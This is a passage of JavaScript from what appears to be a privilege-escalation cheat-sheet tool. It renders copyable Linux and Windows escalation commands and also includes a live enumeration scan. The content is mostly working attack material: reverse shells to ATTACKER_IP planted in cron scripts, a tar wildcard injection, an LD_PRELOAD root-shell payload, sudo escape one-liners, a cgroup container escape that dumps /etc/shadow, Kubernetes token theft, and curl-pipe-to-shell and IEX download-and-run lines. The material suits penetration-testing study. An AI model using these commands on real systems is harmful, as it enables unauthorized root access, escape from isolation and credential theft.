  function copyText(text) {
    navigator.clipboard.writeText(text).catch(() => {});
  }

  function cmdBlock(cmd, id) {
    const cid = id || ('c' + Math.random().toString(36).slice(2, 8));
    return `<div class="pe-cmd"><button class="pe-copy" data-copy="${cid}">Copy</button><span id="${cid}">${esc(cmd)}</span></div>`;
  }

  function renderLinux() {
    const cliReady = window._bridge && window._bridge.connected;
    let html = '';
    if (cliReady) {
      html += `<div style="background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);border-radius:8px;padding:14px 18px;margin-bottom:16px;display:flex;align-items:center;gap:12px;flex-wrap:wrap">
        <span style="color:#22c55e;font-weight:700;font-size:13px">[CLI CONNECTED]</span>
        <span style="color:#c8d6e5;font-size:12px">Run real enumeration on your system</span>
        <button class="pe-btn" id="pe-live-scan" style="margin-left:auto">Run Live Scan</button>
      </div><div id="pe-live-results" style="margin-bottom:16px"></div>`;
    }
    html += `<div class="pe-sub-tabs">
      <button class="pe-sub-tab ${activeLinuxSub === 'suid' ? 'active' : ''}" data-lsub="suid">SUID/SGID Binaries</button>
      <button class="pe-sub-tab ${activeLinuxSub === 'kernel' ? 'active' : ''}" data-lsub="kernel">Kernel Exploits</button>
      <button class="pe-sub-tab ${activeLinuxSub === 'caps' ? 'active' : ''}" data-lsub="caps">Capabilities</button>
      <button class="pe-sub-tab ${activeLinuxSub === 'cron' ? 'active' : ''}" data-lsub="cron">Cron Abuse</button>
      <button class="pe-sub-tab ${activeLinuxSub === 'sudo' ? 'active' : ''}" data-lsub="sudo">Sudo Misconfig</button>
      <button class="pe-sub-tab ${activeLinuxSub === 'docker' ? 'active' : ''}" data-lsub="docker">Container Escape</button>
      <button class="pe-sub-tab ${activeLinuxSub === 'path' ? 'active' : ''}" data-lsub="path">PATH Injection</button>
    </div>`;

    if (activeLinuxSub === 'suid') {
      html += `<p class="pe-section-label">SUID/SGID EXPLOITABLE BINARIES (${PE_SUID_BINS.length})</p>
      <p style="font-size:12px;color:#6a8aaa;margin-bottom:14px">Find SUID: <code style="color:#00ff88">find / -perm -4000 -type f 2>/dev/null</code> | Cross-reference below or at <a href="https://gtfobins.github.io/" target="_blank" rel="noopener" style="color:#bf7fff">GTFOBins</a></p>
      <div class="pe-grid">`;
      for (const b of PE_SUID_BINS) {
        html += `<div class="pe-card">
          <div class="pe-card-head"><span class="pe-card-title">${esc(b.bin)}</span>
          <a href="https://gtfobins.github.io/gtfobins/${encodeURIComponent(b.bin)}/#suid" target="_blank" rel="noopener" style="font-size:11px;color:#bf7fff;text-decoration:none">GTFOBins &rarr;</a></div>
          <div class="pe-card-body"><div class="pe-note">${esc(b.note)}</div>${cmdBlock(b.cmd)}</div></div>`;
      }
      html += '</div>';
    } else if (activeLinuxSub === 'kernel') {
      html += `<p class="pe-section-label">KERNEL EXPLOIT FINDER</p>
      <div style="display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap;align-items:center">
        <input class="pe-input" id="pe-kernel-input" placeholder="Enter kernel version (e.g. 5.4.0)" style="max-width:300px">
        <button class="pe-btn" id="pe-kernel-check">Check Exploits</button>
      </div>
      <div id="pe-kernel-results"></div>
      <p class="pe-section-label" style="margin-top:20px">ALL KNOWN KERNEL EXPLOITS</p>`;
      for (const e of PE_KERNEL_EXPLOITS) {
        html += `<div class="pe-kernel-match">
          <h4>${esc(e.name)}</h4>
          <span class="pe-cve">${esc(e.cve)}</span> &mdash; <span class="pe-range">Kernel ${esc(e.range)}</span>
          <p>${esc(e.desc)}</p></div>`;
      }
    } else if (activeLinuxSub === 'caps') {
      html += `<p class="pe-section-label">LINUX CAPABILITIES ABUSE</p>
      <p style="font-size:12px;color:#6a8aaa;margin-bottom:14px">Find capabilities: <code style="color:#00ff88">getcap -r / 2>/dev/null</code></p>
      <div class="pe-grid">`;
      for (const c of PE_CAPS) {
        const rl = c.risk.toLowerCase();
        html += `<div class="pe-card">
          <div class="pe-card-head"><span class="pe-card-title">${esc(c.cap)}</span><span class="pe-card-risk ${rl}">${esc(c.risk)}</span></div>
          <div class="pe-card-body"><p>${esc(c.desc)}</p>${cmdBlock(c.cmd)}</div></div>`;
      }
      html += '</div>';
    } else if (activeLinuxSub === 'cron') {
      html += `<p class="pe-section-label">CRON JOB ABUSE TECHNIQUES</p>
      <div class="pe-card"><div class="pe-card-head"><span class="pe-card-title">Enumerate Cron Jobs</span></div>
        <div class="pe-card-body">
          ${cmdBlock('crontab -l 2>/dev/null')}
          ${cmdBlock('ls -la /etc/cron*')}
          ${cmdBlock('cat /etc/crontab')}
          ${cmdBlock('grep -r "CRON" /var/log/ 2>/dev/null | tail -20')}
        </div></div>
      <div class="pe-card"><div class="pe-card-head"><span class="pe-card-title">Writable Cron Script</span><span class="pe-card-risk critical">Critical</span></div>
        <div class="pe-card-body"><p>If a cron job runs a script you can write to:</p>
          ${cmdBlock('echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /path/to/cron_script.sh')}
        </div></div>
      <div class="pe-card"><div class="pe-card-head"><span class="pe-card-title">Cron PATH Abuse</span><span class="pe-card-risk high">High</span></div>
        <div class="pe-card-body"><p>If crontab uses a custom PATH and calls a binary without full path:</p>
          ${cmdBlock('# crontab: PATH=/home/user:/usr/local/sbin:...\n# * * * * * backup.sh\n\necho "#!/bin/bash\\ncp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" > /home/user/backup.sh\nchmod +x /home/user/backup.sh')}
        </div></div>
      <div class="pe-card"><div class="pe-card-head"><span class="pe-card-title">Wildcard Injection (tar)</span><span class="pe-card-risk high">High</span></div>
        <div class="pe-card-body"><p>If cron runs <code>tar czf backup.tar.gz *</code> in a writable directory:</p>
          ${cmdBlock('echo "" > "--checkpoint=1"\necho "" > "--checkpoint-action=exec=sh shell.sh"\necho "#!/bin/bash\\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" > shell.sh')}
        </div></div>
      <div class="pe-card"><div class="pe-card-head"><span class="pe-card-title">Monitor with pspy</span></div>
        <div class="pe-card-body"><p>Use pspy to watch processes without root (detects cron jobs):</p>
          ${cmdBlock('wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64\nchmod +x pspy64 && ./pspy64')}
        </div></div>`;
    } else if (activeLinuxSub === 'sudo') {
      html += `<p class="pe-section-label">SUDO MISCONFIGURATION</p>
      <div class="pe-card"><div class="pe-card-head"><span class="pe-card-title">Check Sudo Permissions</span></div>
        <div class="pe-card-body">${cmdBlock('sudo -l')}<p>Look for: NOPASSWD entries, env_keep (LD_PRELOAD, LD_LIBRARY_PATH), wildcard commands, writable scripts</p></div></div>
      <div class="pe-card"><div class="pe-card-head"><span class="pe-card-title">LD_PRELOAD Exploitation</span><span class="pe-card-risk critical">Critical</span></div>
        <div class="pe-card-body"><p>If <code>env_keep += LD_PRELOAD</code> is set in sudoers:</p>
          ${cmdBlock('// pe.c\n#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\nvoid _init() {\n  unsetenv("LD_PRELOAD");\n  setresuid(0,0,0);\n  system("/bin/bash -p");\n}')}
          ${cmdBlock('gcc -fPIC -shared -nostartfiles -o /tmp/pe.so pe.c\nsudo LD_PRELOAD=/tmp/pe.so <allowed_command>')}
        </div></div>
      <div class="pe-card"><div class="pe-card-head"><span class="pe-card-title">LD_LIBRARY_PATH Exploitation</span><span class="pe-card-risk critical">Critical</span></div>
        <div class="pe-card-body"><p>If <code>env_keep += LD_LIBRARY_PATH</code>:</p>
          ${cmdBlock('ldd /usr/sbin/apache2  # Find shared libraries\n# Create malicious lib with same name\ngcc -o /tmp/libcrypt.so.1 -shared -fPIC pe.c\nsudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2')}
        </div></div>
      <div class="pe-card"><div class="pe-card-head"><span class="pe-card-title">Common Sudo Bypasses</span><span class="pe-card-risk high">High</span></div>
        <div class="pe-card-body">
          ${cmdBlock('# (ALL) NOPASSWD: /usr/bin/find\nsudo find / -exec /bin/sh \\; -quit')}
          ${cmdBlock('# (ALL) NOPASSWD: /usr/bin/vim\nsudo vim -c \'!sh\'')}
          ${cmdBlock('# (ALL) NOPASSWD: /usr/bin/awk\nsudo awk \'BEGIN {system("/bin/sh")}\'')}
          ${cmdBlock('# (ALL) NOPASSWD: /usr/bin/less\nsudo less /etc/hosts  # then type !sh')}
          ${cmdBlock('# (ALL) NOPASSWD: /usr/bin/nmap\nsudo nmap --interactive  # then !sh (older nmap)')}
          ${cmdBlock('# (ALL) NOPASSWD: /usr/bin/env\nsudo env /bin/sh')}
          ${cmdBlock('# (root) NOPASSWD: /usr/bin/python3\nsudo python3 -c \'import os; os.system("/bin/bash")\'')}
        </div></div>`;
    } else if (activeLinuxSub === 'docker') {
      html += `<p class="pe-section-label">CONTAINER ESCAPE TECHNIQUES</p>
      <div class="pe-card"><div class="pe-card-head"><span class="pe-card-title">Detect Container Environment</span></div>
        <div class="pe-card-body">
          ${cmdBlock('# Check if in Docker\ncat /proc/1/cgroup 2>/dev/null | grep -qi docker && echo "DOCKER" || echo "Not Docker"\nls /.dockerenv 2>/dev/null && echo "Docker (.dockerenv exists)"')}
          ${cmdBlock('# Check if privileged\nip link add dummy0 type dummy 2>/dev/null && echo "PRIVILEGED" && ip link delete dummy0 || echo "NOT privileged"')}
          ${cmdBlock('# Check capabilities\ncat /proc/self/status | grep -i cap\ncapsh --print 2>/dev/null')}
        </div></div>
      <div class="pe-card"><div class="pe-card-head"><span class="pe-card-title">Docker Socket Mount</span><span class="pe-card-risk critical">Critical</span></div>
        <div class="pe-card-body"><p>If /var/run/docker.sock is mounted inside the container:</p>
          ${cmdBlock('ls -la /var/run/docker.sock\ndocker run -it -v /:/host/ ubuntu chroot /host/ bash')}
        </div></div>
      <div class="pe-card"><div class="pe-card-head"><span class="pe-card-title">Privileged Container Escape (cgroups)</span><span class="pe-card-risk critical">Critical</span></div>
        <div class="pe-card-body"><p>If container runs with --privileged flag:</p>
          ${cmdBlock('mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x\necho 1 > /tmp/cgrp/x/notify_on_release\nhost_path=$(sed -n \'s/.*\\perdir=\\([^,]*\\).*/\\1/p\' /etc/mtab)\necho "$host_path/exploit" > /tmp/cgrp/release_agent\necho "#!/bin/sh" > /exploit\necho "cat /etc/shadow > $host_path/output" >> /exploit\nchmod a+x /exploit\nsh -c "echo \\$\\$ > /tmp/cgrp/x/cgroup.procs"\ncat /output')}
        </div></div>
      <div class="pe-card"><div class="pe-card-head"><span class="pe-card-title">nsenter Escape</span><span class="pe-card-risk critical">Critical</span></div>
        <div class="pe-card-body"><p>If CAP_SYS_ADMIN or --privileged:</p>
          ${cmdBlock('nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash')}
        </div></div>
      <div class="pe-card"><div class="pe-card-head"><span class="pe-card-title">Kubernetes Escape</span><span class="pe-card-risk high">High</span></div>
        <div class="pe-card-body">
          ${cmdBlock('# Check for service account token\nls /var/run/secrets/kubernetes.io/serviceaccount/\ncat /var/run/secrets/kubernetes.io/serviceaccount/token')}
          ${cmdBlock('# Check for host filesystem mounts\nmount | grep -v "overlay\\|proc\\|sys\\|cgroup"')}
        </div></div>`;
    } else if (activeLinuxSub === 'path') {
      html += `<p class="pe-section-label">PATH INJECTION</p>
      <div class="pe-card"><div class="pe-card-head"><span class="pe-card-title">Identify Vulnerable SUID Binary</span></div>
        <div class="pe-card-body"><p>If a SUID binary calls another command without a full path:</p>
          ${cmdBlock('# Find SUID binaries\nfind / -perm -4000 -type f 2>/dev/null\n\n# Check which commands it calls\nstrings /usr/local/bin/suid_binary\nstrace /usr/local/bin/suid_binary 2>&1 | grep exec\nltrace /usr/local/bin/suid_binary 2>&1 | grep system')}
        </div></div>
      <div class="pe-card"><div class="pe-card-head"><span class="pe-card-title">Exploit via PATH Hijacking</span><span class="pe-card-risk critical">Critical</span></div>
        <div class="pe-card-body"><p>Create a malicious binary with the same name in a directory earlier in PATH:</p>
          ${cmdBlock('# If binary calls "service" without full path:\necho \'#!/bin/bash\\n/bin/bash -p\' > /tmp/service\nchmod +x /tmp/service\nexport PATH=/tmp:$PATH\n/usr/local/bin/suid_binary')}
          ${cmdBlock('# Alternative: C version for static linking\necho \'#include <stdlib.h>\\nint main() { setuid(0); system("/bin/bash -p"); }\' > /tmp/service.c\ngcc /tmp/service.c -o /tmp/service\nexport PATH=/tmp:$PATH\n/usr/local/bin/suid_binary')}
        </div></div>`;
    }
    return html;
  }

  function renderWindows() {
    let html = `<div class="pe-sub-tabs">
      <button class="pe-sub-tab ${activeWinSub === 'vectors' ? 'active' : ''}" data-wsub="vectors">Attack Vectors</button>
      <button class="pe-sub-tab ${activeWinSub === 'enum' ? 'active' : ''}" data-wsub="enum">Enumeration</button>
    </div>`;

    if (activeWinSub === 'vectors') {
      html += `<p class="pe-section-label">WINDOWS PRIVILEGE ESCALATION VECTORS</p><div class="pe-grid">`;
      for (const v of PE_WIN_VECTORS) {
        html += `<div class="pe-card">
          <div class="pe-card-head"><span class="pe-card-title">${esc(v.name)}</span><span class="pe-card-risk high">High</span></div>
          <div class="pe-card-body">
            <p>${esc(v.desc)}</p>
            <p class="pe-section-label" style="margin-top:10px">Detection</p>
            ${cmdBlock(v.check)}
            <p class="pe-section-label" style="margin-top:10px">Exploitation</p>
            ${cmdBlock(v.exploit)}
          </div></div>`;
      }
      html += '</div>';
    } else {
      html += `<p class="pe-section-label">WINDOWS ENUMERATION COMMANDS</p>`;
      for (const g of PE_WIN_CHECKLIST) {
        html += `<div class="pe-card"><div class="pe-card-head"><span class="pe-card-title">${esc(g.cat)}</span></div>
          <div class="pe-card-body">`;
        for (const it of g.items) {
          html += `<p style="margin:6px 0 2px;color:#e2e8f0;font-size:13px">${esc(it.text)}</p>${cmdBlock(it.cmd)}`;
        }
        html += '</div></div>';
      }
    }
    return html;
  }

  function renderChecklist(os) {
    const list = os === 'windows' ? PE_WIN_CHECKLIST : PE_LINUX_CHECKLIST;
    const prefix = os === 'windows' ? 'w' : 'l';
    let total = 0, done = 0;
    for (const g of list) { total += g.items.length; for (const it of g.items) { if (checkedItems.has(prefix + it.text)) done++; } }
    const pct = total ? Math.round((done / total) * 100) : 0;

    let html = `<div style="display:flex;gap:10px;margin-bottom:16px">
      <button class="pe-sub-tab ${os === 'linux' ? 'active' : ''}" data-cos="linux">Linux</button>
      <button class="pe-sub-tab ${os === 'windows' ? 'active' : ''}" data-cos="windows">Windows</button>
      <button class="pe-btn pe-btn-sm" id="pe-reset-checks" style="margin-left:auto">Reset All</button>
    </div>
    <div class="pe-progress">
      <div class="pe-progress-bar"><div class="pe-progress-fill" style="width:${pct}%"></div></div>
      <span class="pe-progress-text">${done}/${total} (${pct}%)</span>
    </div>`;

    for (const g of list) {
      html += `<div class="pe-checklist-group"><h3>${esc(g.cat)}</h3>`;
      for (const it of g.items) {
        const key = prefix + it.text;
        const isDone = checkedItems.has(key);
        html += `<div class="pe-check-item ${isDone ? 'done' : ''}" data-ck="${esc(key)}">
          <div class="pe-check-box">${isDone ? '&#10003;' : ''}</div>
          <div><div class="pe-check-text">${esc(it.text)}</div>
          <div class="pe-check-cmd">${esc(it.cmd)}</div></div></div>`;
      }
      html += '</div>';
    }
    return html;
  }

  function renderCmdGen() {
    let html = `<div class="pe-cmd-gen-grid"><div class="pe-cmd-list">`;
    for (const t of PE_CMD_TEMPLATES) {
      html += `<div class="pe-cmd-cat ${t.cat === cmdCat ? 'active' : ''}" data-cmdcat="${esc(t.cat)}">${esc(t.cat)}</div>`;
    }
    html += '</div><div class="pe-cmd-detail">';
    const active = PE_CMD_TEMPLATES.find(t => t.cat === cmdCat);
    if (active) {
      html += `<p class="pe-section-label">${esc(active.cat)}</p>`;
      for (const c of active.cmds) {
        html += `<div class="pe-cmd-entry"><h4>${esc(c.name)}</h4>${cmdBlock(c.cmd)}</div>`;
      }
    }
    html += '</div></div>';
    return html;
  }

  function renderReference() {
    let html = `<p class="pe-section-label">ESSENTIAL TOOLS &amp; RESOURCES</p><div class="pe-grid">`;
    for (const r of PE_REFS) {
      html += `<div class="pe-ref-card">
        <div><div class="pe-ref-name">${esc(r.name)}</div>
        <div class="pe-ref-desc">${esc(r.desc)}</div>
        <div class="pe-ref-url">${esc(r.url)}</div></div></div>`;
    }
    html += '</div>';
    html += `<p class="pe-section-label" style="margin-top:24px">AUTOMATED ENUMERATION SCRIPTS</p>
    <div class="pe-card"><div class="pe-card-head"><span class="pe-card-title">LinPEAS (Linux)</span></div>
      <div class="pe-card-body">${cmdBlock('# Download and run\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n\n# Or transfer and run\nwget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh\nchmod +x linpeas.sh && ./linpeas.sh -a 2>&1 | tee linpeas_output.txt')}</div></div>
    <div class="pe-card"><div class="pe-card-head"><span class="pe-card-title">WinPEAS (Windows)</span></div>
      <div class="pe-card-body">${cmdBlock('# Download and run\ncertutil -urlcache -split -f https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe winpeas.exe\n.\\winpeas.exe\n\n# Or use PowerShell\nIEX(New-Object Net.WebClient).downloadString(\'https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1\')')}</div></div>
    <div class="pe-card"><div class="pe-card-head"><span class="pe-card-title">linux-exploit-suggester</span></div>
      <div class="pe-card-body">${cmdBlock('wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh\nchmod +x linux-exploit-suggester.sh && ./linux-exploit-suggester.sh')}</div></div>
    <div class="pe-card"><div class="pe-card-head"><span class="pe-card-title">Seatbelt (Windows)</span></div>
      <div class="pe-card-body">${cmdBlock('# Compile from source or use prebuilt\nSeatbelt.exe -group=all -full')}</div></div>`;
    return html;
  }

  let checklistOS = 'linux';

  function render() {
    if (activeTab === 'linux') content.innerHTML = renderLinux();
    else if (activeTab === 'windows') content.innerHTML = renderWindows();
    else if (activeTab === 'checklist') content.innerHTML = renderChecklist(checklistOS);
    else if (activeTab === 'cmdgen') content.innerHTML = renderCmdGen();
    else if (activeTab === 'reference') content.innerHTML = renderReference();
  }

  render();

  wrap.addEventListener('click', e => {
    const tab = e.target.closest('.pe-tab');
    if (tab) { activeTab = tab.dataset.tab; wrap.querySelectorAll('.pe-tab').forEach(t => t.classList.toggle('active', t === tab)); render(); return; }

    const lsub = e.target.closest('[data-lsub]');
    if (lsub) { activeLinuxSub = lsub.dataset.lsub; render(); return; }

    const liveScan = e.target.closest('#pe-live-scan');
    if (liveScan && window._bridge && window._bridge.connected) {
      const res = document.getElementById('pe-live-results');
      if (res) {
        liveScan.textContent = 'Scanning...'; liveScan.disabled = true;
        (async () => {
          const cmds = [
            ['System Info', 'id && uname -a'],
            ['SUID Binaries', 'find / -perm -4000 -type f 2>/dev/null | head -30'],
            ['Sudo Permissions', 'sudo -l 2>/dev/null || echo "Cannot check sudo"'],
            ['Capabilities', 'getcap -r / 2>/dev/null | head -20'],
            ['Cron Jobs', 'cat /etc/crontab 2>/dev/null; ls -la /etc/cron.* 2>/dev/null | head -20'],
            ['Writable /etc/passwd', 'test -w /etc/passwd && echo "WRITABLE - VULNERABLE" || echo "Not writable"'],
            ['Docker Group', 'groups 2>/dev/null | grep -o docker || echo "Not in docker group"'],
            ['Listening Ports', 'ss -tuln 2>/dev/null || netstat -tuln 2>/dev/null | head -20']
          ];
          let html = '';
          for (const [label, cmd] of cmds) {
            try {
              const r = await window._bridge.exec(cmd);
              const out = (r.stdout || '').trim() || '(empty)';
              const color = out.includes('VULNERABLE') || out.includes('root') && label !== 'System Info' ? '#ef4444' : '#c8d6e5';
              html += '<div style="margin-bottom:12px"><div style="color:#00aaff;font-size:12px;font-weight:700;margin-bottom:4px">' + esc(label) + ' <span style="color:#22c55e;font-size:10px">[LIVE]</span></div><pre style="font-size:11px;color:' + color + ';background:rgba(0,0,0,.3);padding:10px;border-radius:6px;overflow-x:auto;max-height:150px">' + esc(out) + '</pre></div>';
            } catch (er) { html += '<div style="margin-bottom:12px;color:#ef4444;font-size:12px">' + esc(label) + ': ' + esc(er.message) + '</div>'; }
          }
          res.innerHTML = html;
          liveScan.textContent = 'Run Live Scan'; liveScan.disabled = false;
        })();
      }
      return;
    }

    const wsub = e.target.closest('[data-wsub]');
    if (wsub) { activeWinSub = wsub.dataset.wsub; render(); return; }

    const cos = e.target.closest('[data-cos]');
    if (cos) { checklistOS = cos.dataset.cos; render(); return; }

    const ck = e.target.closest('.pe-check-item');
    if (ck) {
      const key = ck.dataset.ck;
      if (checkedItems.has(key)) checkedItems.delete(key); else checkedItems.add(key);
      render(); return;
    }

    const resetBtn = e.target.closest('#pe-reset-checks');
    if (resetBtn) { checkedItems.clear(); render(); return; }

    const cmdcat = e.target.closest('.pe-cmd-cat');
    if (cmdcat) { cmdCat = cmdcat.dataset.cmdcat; render(); return; }

    const copyBtn = e.target.closest('.pe-copy');
    if (copyBtn) {
      const id = copyBtn.dataset.copy;
      const el = document.getElementById(id);
      if (el) { copyText(el.textContent); copyBtn.textContent = 'Copied!'; setTimeout(() => { copyBtn.textContent = 'Copy'; }, 1500); }
      return;
    }

    const kernelBtn = e.target.closest('#pe-kernel-check');
    if (kernelBtn) {
      const input = document.getElementById('pe-kernel-input');
      if (!input) return;
      const ver = input.value.trim();
      if (!ver) return;
      const parts = ver.split('.').map(Number);
      const results = document.getElementById('pe-kernel-results');
      if (!results) return;

      const matches = PE_KERNEL_EXPLOITS.filter(ex => {
        const [lo, hi] = ex.range.split('-').map(s => s.trim().split('.').map(Number));
        const inRange = (v, l, h) => {
          for (let i = 0; i < Math.max(v.length, l.length, h.length); i++) {
            const vi = v[i] || 0, li = l[i] || 0, hi2 = h[i] || 0;
            if (vi < li) return false;
            if (vi > hi2) return i === 0 ? false : true;
            if (vi > li && vi < hi2) return true;
          }
          return true;
        };
        return inRange(parts, lo, hi);
      });

      if (matches.length === 0) {
        results.innerHTML = '<p style="color:#00e676;padding:12px">No known kernel exploits found for this version. Try LinPEAS or linux-exploit-suggester for a comprehensive check.</p>';
      } else {
        results.innerHTML = `<p style="color:#ff9100;margin-bottom:10px;font-size:13px">${matches.length} potential exploit(s) found:</p>` +
          matches.map(m => `<div class="pe-kernel-match"><h4>${esc(m.name)}</h4><span class="pe-cve">${esc(m.cve)}</span> &mdash; <span class="pe-range">Kernel ${esc(m.range)}</span><p>${esc(m.desc)}</p></div>`).join('');
      }
    }
  });
}
